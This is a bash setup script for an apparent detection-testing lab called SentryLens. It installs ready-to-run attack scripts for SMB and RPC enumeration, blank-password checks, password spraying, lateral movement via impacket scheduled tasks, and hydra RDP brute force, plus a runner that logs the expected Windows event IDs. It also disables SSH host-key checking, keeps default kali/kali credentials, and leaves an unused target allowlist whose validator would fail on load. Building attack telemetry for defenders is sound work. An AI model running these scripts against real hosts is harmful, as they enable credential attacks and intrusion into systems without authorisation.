#!/usr/bin/env bash
#
# 03-configure-attack-tools.sh - Configure attack tools for SentryLens

set -euo pipefail

SSH_USERNAME="${SSH_USERNAME:-kali}"
SSH_PASSWORD="${SSH_PASSWORD:-kali}"

log() { echo -e "\033[36m==>\033[0m $*"; }
ok()   { echo -e "\033[32mOK\033[0m  $*"; }
warn() { echo -e "\033[33m!!\033[0m  $*"; }
err()  { echo -e "\033[31mXX\033[0m  $*"; }

log "Configuring attack tools for SentryLens..."

# Create attack scenario scripts that match the SentryLens attack_scenarios.py
mkdir -p /opt/sentrylens/attacks

# SMB Enumeration scenario
cat > /opt/sentrylens/attacks/smb_enum.sh <<'EOF'
#!/usr/bin/env bash
# SMB Enumeration - MITRE T1021.002
# Usage: ./smb_enum.sh <target_ip>

set -euo pipefail

TARGET="${1:-}"
if [ -z "${TARGET}" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_DIR="/opt/sentrylens/attacks/results/smb_enum_${TARGET}_${TIMESTAMP}"
mkdir -p "${OUTPUT_DIR}"

echo "[+] Starting SMB enumeration against ${TARGET}"
echo "[+] Results will be saved to ${OUTPUT_DIR}"

# Null session enumeration
echo "[+] Testing null sessions..."
crackmapexec smb ${TARGET} -u '' -p '' --shares 2>&1 | tee "${OUTPUT_DIR}/null_sessions.txt"

# Enum4linux
echo "[+] Running enum4linux..."
enum4linux -a ${TARGET} 2>&1 | tee "${OUTPUT_DIR}/enum4linux.txt"

# SMB share listing with smbclient
echo "[+] Listing shares with smbclient..."
smbclient -L //${TARGET} -N 2>&1 | tee "${OUTPUT_DIR}/shares.txt"

# RPC enumeration
echo "[+] RPC enumeration..."
rpcclient -U "" -N ${TARGET} -c "enumdomains; enumdomusers; enumdomgroups; querydominfo" 2>&1 | tee "${OUTPUT_DIR}/rpc.txt"

echo "[+] SMB enumeration completed. Results in ${OUTPUT_DIR}"
EOF

chmod +x /opt/sentrylens/attacks/smb_enum.sh

# Blank password check scenario
cat > /opt/sentrylens/attacks/blank_password_check.sh <<'EOF'
#!/usr/bin/env bash
# Blank Password Check - MITRE T1110.003
# Usage: ./blank_password_check.sh <target_ip>

set -euo pipefail

TARGET="${1:-}"
if [ -z "${TARGET}" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_DIR="/opt/sentrylens/attacks/results/blank_pass_${TARGET}_${TIMESTAMP}"
mkdir -p "${OUTPUT_DIR}"

echo "[+] Checking for blank passwords on ${TARGET}"
echo "[+] Results will be saved to ${OUTPUT_DIR}"

# Test common usernames with blank passwords
COMMON_USERS=("Administrator" "admin" "guest" "user" "test" "backup" "service" "sql" "oracle" "mysql" "postgres")

for user in "${COMMON_USERS[@]}"; do
    echo "[+] Testing user: ${user}"
    crackmapexec smb ${TARGET} -u "${user}" -p '' --local-auth 2>&1 | tee -a "${OUTPUT_DIR}/blank_check.txt"
done

# Also test with crackmapexec for all users if we can enumerate them
echo "[+] Attempting user enumeration for blank password spray..."
crackmapexec smb ${TARGET} -u '' -p '' --users 2>&1 | tee "${OUTPUT_DIR}/users.txt"

echo "[+] Blank password check completed. Results in ${OUTPUT_DIR}"
EOF

chmod +x /opt/sentrylens/attacks/blank_password_check.sh

# Account lockout spray scenario
cat > /opt/sentrylens/attacks/account_lockout_spray.sh <<'EOF'
#!/usr/bin/env bash
# Account Lockout Spray - MITRE T1110.003
# Usage: ./account_lockout_spray.sh <target_ip> [userlist] [password]

set -euo pipefail

TARGET="${1:-}"
USERLIST="${2:-/usr/share/wordlists/userlist.txt}"
PASSWORD="${3:-Password123}"

if [ -z "${TARGET}" ]; then
    echo "Usage: $0 <target_ip> [userlist] [password]"
    exit 1
fi

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_DIR="/opt/sentrylens/attacks/results/spray_${TARGET}_${TIMESTAMP}"
mkdir -p "${OUTPUT_DIR}"

echo "[+] Password spray against ${TARGET} with password: ${PASSWORD}"
echo "[+] Using userlist: ${USERLIST}"
echo "[+] Results will be saved to ${OUTPUT_DIR}"

# Single password spray
crackmapexec smb ${TARGET} -u ${USERLIST} -p "${PASSWORD}" --local-auth 2>&1 | tee "${OUTPUT_DIR}/spray_results.txt"

echo "[+] Password spray completed. Results in ${OUTPUT_DIR}"
EOF

chmod +x /opt/sentrylens/attacks/account_lockout_spray.sh

# Lateral movement with schtasks scenario
cat > /opt/sentrylens/attacks/lateral_movement_schtasks.sh <<'EOF'
#!/usr/bin/env bash
# Lateral Movement via Scheduled Tasks - MITRE T1053.005
# Usage: ./lateral_movement_schtasks.sh <target_ip> <username> <password>

set -euo pipefail

TARGET="${1:-}"
USERNAME="${2:-}"
PASSWORD="${3:-}"

if [ -z "${TARGET}" ] || [ -z "${USERNAME}" ] || [ -z "${PASSWORD}" ]; then
    echo "Usage: $0 <target_ip> <username> <password>"
    exit 1
fi

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_DIR="/opt/sentrylens/attacks/results/schtasks_${TARGET}_${TIMESTAMP}"
mkdir -p "${OUTPUT_DIR}"

echo "[+] Attempting lateral movement via schtasks on ${TARGET}"
echo "[+] Results will be saved to ${OUTPUT_DIR}"

# Create a scheduled task that runs a command
TASK_NAME="SentryLensTest${RANDOM}"
COMMAND="cmd.exe /c whoami > C:\\Windows\\Temp\\schtasks_output.txt 2>&1"

echo "[+] Creating scheduled task: ${TASK_NAME}"
impacket-schtasks ${USERNAME}:${PASSWORD}@${TARGET} create -tn "${TASK_NAME}" -tr "${COMMAND}" -sc ONCE -st 00:00 2>&1 | tee "${OUTPUT_DIR}/create_task.txt"

echo "[+] Running scheduled task..."
impacket-schtasks ${USERNAME}:${PASSWORD}@${TARGET} run -tn "${TASK_NAME}" 2>&1 | tee "${OUTPUT_DIR}/run_task.txt"

sleep 3

echo "[+] Cleaning up scheduled task..."
impacket-schtasks ${USERNAME}:${PASSWORD}@${TARGET} delete -tn "${TASK_NAME}" 2>&1 | tee "${OUTPUT_DIR}/delete_task.txt"

# Try to retrieve output via SMB
echo "[+] Attempting to retrieve output..."
smbclient //${TARGET}/C$ -U "${USERNAME}%${PASSWORD}" -c "get Windows/Temp/schtasks_output.txt ${OUTPUT_DIR}/schtasks_output.txt" 2>&1 | tee -a "${OUTPUT_DIR}/retrieve_output.txt"

echo "[+] Lateral movement test completed. Results in ${OUTPUT_DIR}"
EOF

chmod +x /opt/sentrylens/attacks/lateral_movement_schtasks.sh

# RDP brute force scenario
cat > /opt/sentrylens/attacks/brute_force_rdp.sh <<'EOF'
#!/usr/bin/env bash
# RDP Brute Force - MITRE T1110.001
# Usage: ./brute_force_rdp.sh <target_ip> [username] [wordlist]

set -euo pipefail

TARGET="${1:-}"
USERNAME="${2:-Administrator}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

if [ -z "${TARGET}" ]; then
    echo "Usage: $0 <target_ip> [username] [wordlist]"
    exit 1
fi

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_DIR="/opt/sentrylens/attacks/results/rdp_brute_${TARGET}_${TIMESTAMP}"
mkdir -p "${OUTPUT_DIR}"

echo "[+] RDP brute force against ${TARGET}"
echo "[+] Username: ${USERNAME}"
echo "[+] Wordlist: ${WORDLIST}"
echo "[+] Results will be saved to ${OUTPUT_DIR}"

# Use hydra for RDP brute force
hydra -l "${USERNAME}" -P "${WORDLIST}" rdp://${TARGET} -t 4 -V -o "${OUTPUT_DIR}/hydra_results.txt" 2>&1 | tee "${OUTPUT_DIR}/hydra_output.txt"

echo "[+] RDP brute force completed. Results in ${OUTPUT_DIR}"
EOF

chmod +x /opt/sentrylens/attacks/brute_force_rdp.sh

# Create a master attack runner that logs to attack_log.jsonl format
cat > /opt/sentrylens/attacks/run_attack.py <<'PYEOF'
#!/usr/bin/env python3
"""
SentryLens Attack Runner
Runs attack scenarios and logs them in the format expected by attack_scenarios.py
"""
import json
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Any, Optional

ATTACK_LOG = Path("/opt/sentrylens/attacks/attack_log.jsonl")
ATTACK_LOG.parent.mkdir(parents=True, exist_ok=True)

SCENARIOS = {
    "smb_enum": {
        "script": "/opt/sentrylens/attacks/smb_enum.sh",
        "mitre": "T1021.002",
        "description": "SMB Enumeration",
        "expected_event_ids": [4624, 4625, 4634, 5140, 5145],
    },
    "blank_password_check": {
        "script": "/opt/sentrylens/attacks/blank_password_check.sh",
        "mitre": "T1110.003",
        "description": "Blank Password Check",
        "expected_event_ids": [4625, 4624],
    },
    "account_lockout_spray": {
        "script": "/opt/sentrylens/attacks/account_lockout_spray.sh",
        "mitre": "T1110.003",
        "description": "Password Spray Attack",
        "expected_event_ids": [4625, 4740, 4771],
    },
    "lateral_movement_schtasks": {
        "script": "/opt/sentrylens/attacks/lateral_movement_schtasks.sh",
        "mitre": "T1053.005",
        "description": "Lateral Movement via Scheduled Tasks",
        "expected_event_ids": [4698, 4699, 4700, 4701, 4702, 4624, 4688],
    },
    "brute_force_rdp": {
        "script": "/opt/sentrylens/attacks/brute_force_rdp.sh",
        "mitre": "T1110.001",
        "description": "RDP Brute Force",
        "expected_event_ids": [4625, 4624, 4771, 4776],
    },
}

def log_attack(scenario_name: str, target_ip: str, source_ip: str, 
               status: str, details: Dict[str, Any], start_time: datetime, 
               end_time: datetime) -> None:
    """Log attack to JSONL file."""
    record = {
        "attack_id": str(uuid.uuid4()),
        "scenario_name": scenario_name,
        "scenario_description": SCENARIOS[scenario_name]["description"],
        "mitre_technique": SCENARIOS[scenario_name]["mitre"],
        "target_ip": target_ip,
        "source_ip": source_ip,
        "status": status,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "duration_seconds": (end_time - start_time).total_seconds(),
        "details": details,
        "expected_event_ids": SCENARIOS[scenario_name]["expected_event_ids"],
    }
    
    with open(ATTACK_LOG, "a") as f:
        f.write(json.dumps(record) + "\n")
    
    print(f"[+] Attack logged: {scenario_name} -> {status}")

def run_scenario(scenario_name: str, target_ip: str, source_ip: str, *args) -> None:
    """Run an attack scenario."""
    if scenario_name not in SCENARIOS:
        print(f"[-] Unknown scenario: {scenario_name}")
        print(f"    Available: {', '.join(SCENARIOS.keys())}")
        return
    
    scenario = SCENARIOS[scenario_name]
    script_path = scenario["script"]
    
    if not Path(script_path).exists():
        print(f"[-] Script not found: {script_path}")
        return
    
    print(f"[+] Running {scenario['description']} ({scenario['mitre']}) against {target_ip}")
    
    start_time = datetime.now(timezone.utc)
    
    try:
        # Build command
        cmd = [script_path, target_ip] + list(args)
        
        # Run with timeout
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=3600,  # 1 hour max
        )
        
        end_time = datetime.now(timezone.utc)
        status = "success" if result.returncode == 0 else "failed"
        
        details = {
            "return_code": result.returncode,
            "stdout": result.stdout[-5000:] if result.stdout else "",  # Last 5KB
            "stderr": result.stderr[-5000:] if result.stderr else "",
            "command": " ".join(cmd),
        }
        
    except subprocess.TimeoutExpired:
        end_time = datetime.now(timezone.utc)
        status = "timeout"
        details = {"error": "Attack timed out after 1 hour"}
    except Exception as e:
        end_time = datetime.now(timezone.utc)
        status = "error"
        details = {"error": str(e)}
    
    log_attack(scenario_name, target_ip, source_ip, status, details, start_time, end_time)

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 run_attack.py <scenario> <target_ip> [source_ip] [args...]")
        print(f"Available scenarios: {', '.join(SCENARIOS.keys())}")
        sys.exit(1)
    
    scenario_name = sys.argv[1]
    target_ip = sys.argv[2]
    source_ip = sys.argv[3] if len(sys.argv) > 3 else "auto"
    
    # Auto-detect source IP if needed
    if source_ip == "auto":
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            source_ip = s.getsockname()[0]
            s.close()
        except Exception:
            source_ip = "unknown"
    
    run_scenario(scenario_name, target_ip, source_ip, *sys.argv[4:])

if __name__ == "__main__":
    main()
PYEOF

chmod +x /opt/sentrylens/attacks/run_attack.py
chown -R ${SSH_USERNAME}:${SSH_USERNAME} /opt/sentrylens/attacks

# Configure proxychains for pivoting
cat > /etc/proxychains4.conf <<'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
quiet_mode

[ProxyList]
socks5 127.0.0.1 1080
EOF

# Create SSH config for easier pivoting
mkdir -p /home/${SSH_USERNAME}/.ssh
cat > /home/${SSH_USERNAME}/.ssh/config <<'EOF'
Host *
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR
    ConnectTimeout 10
    ServerAliveInterval 30
    ServerAliveCountMax 3
EOF

chown -R ${SSH_USERNAME}:${SSH_USERNAME} /home/${SSH_USERNAME}/.ssh
chmod 600 /home/${SSH_USERNAME}/.ssh/config

# Create a simple target validation script (matches attack_scenarios.py allowlist)
cat > /opt/sentrylens/scripts/validate_target.py <<'VALPYEOF'
#!/usr/bin/env python3
"""Validate attack targets against allowlist (matches attack_scenarios.py)"""
import ipaddress
import sys
from pathlib import Path

# Default allowlist (documentation networks + loopback)
DEFAULT_ALLOWLIST = [
    "127.0.0.0/8",           # Loopback
    "192.0.2.0/24",          # TEST-NET-1 (RFC 5737)
    "198.51.100.0/24",       # TEST-NET-2 (RFC 5737)
    "203.0.113.0/24",        # TEST-NET-3 (RFC 5737)
    "2001:db8::/32",         # Documentation prefix (RFC 3849)
]

def load_allowlist(path: Optional[Path] = None) -> list:
    """Load allowlist from file or use defaults."""
    networks = [ipaddress.ip_network(n) for n in DEFAULT_ALLOWLIST]
    
    if path and path.exists():
        try:
            import json
            with open(path) as f:
                data = json.load(f)
            for net_str in data.get("allowlist", []):
                networks.append(ipaddress.ip_network(net_str))
        except Exception:
            pass
    
    return networks

def is_allowed(target: str, allowlist: list) -> bool:
    """Check if target IP is in allowlist."""
    try:
        target_ip = ipaddress.ip_address(target)
        return any(target_ip in net for net in allowlist)
    except ValueError:
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: validate_target.py <target_ip> [allowlist_file]")
        sys.exit(1)
    
    target = sys.argv[1]
    allowlist_file = Path(sys.argv[2]) if len(sys.argv) > 2 else None
    
    networks = load_allowlist(allowlist_file)
    
    if is_allowed(target, networks):
        print(f"[+] Target {target} is ALLOWED")
        sys.exit(0)
    else:
        print(f"[-] Target {target} is NOT in allowlist")
        print("    Use --allow-any-target to override (attack_scenarios.py)")
        sys.exit(1)
VALPYEOF

chmod +x /opt/sentrylens/scripts/validate_target.py

ok "Attack tools configured"